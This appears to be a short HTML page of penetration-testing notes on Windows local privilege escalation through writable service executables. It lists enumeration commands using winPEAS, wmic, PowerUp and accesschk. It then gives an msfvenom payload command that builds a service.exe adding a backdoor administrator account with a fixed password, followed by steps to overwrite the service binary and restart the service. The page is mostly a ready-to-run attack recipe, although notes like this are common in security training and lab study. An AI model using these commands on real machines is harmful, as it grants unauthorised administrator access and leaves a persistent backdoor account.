<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Insecure Service Executables</title>
</head><body>Note: remember to create a backup of the original executable<br/>
<br/>
If the original service executable is modifiable by our user, we can simply replace it with our reverse shell executable.<br/>
<br/>
<b>Identification</b><br/>
winPEASany.exe quite servicesinfo<br/>
<br/>
search: <b>File Permissions Service<br/>
</b><b><br/>
get the path<br/>
</b>wmic service get name, startname, pathname<br/>
<b><br/>
<br/>
<br/>
PowerUp.ps1<br/>
Import-Module .\PowerUp.ps1<br/>
</b>Invoke-AllChecks --&gt; check local priv esc<b><br/>
</b><b><br/>
verify with accesschk<br/>
<br/>
</b>.\accesschk.exe /accepteula -quvw "&lt;path to service.exe"<br/>
<br/>
<b>check permission to start and stop service [IMPORTANT CHECK FIRST]<br/>
</b>.\accesschk.exe /accepteula -ucqv user &lt;service name&gt;<b><br/>
</b><br/>
<br/>
<b>Payload<br/>
</b><i>msfvenom -p windows/adduser USER=backdoor_admin PASS=P@ssw0rd! -f exe &gt; service.exe<br/>
</i><br/>
<br/>
copy the payload to &lt;path to service.exe&gt;<i><br/>
</i><i><br/>
<b>restart the services<br/>
</b></i>net stop "Service Name" &amp; sc start "Service Name" &nbsp;<br/>
<br/>
<br/>
<br/>
<br/>
<b>then restart the service</b></body></html>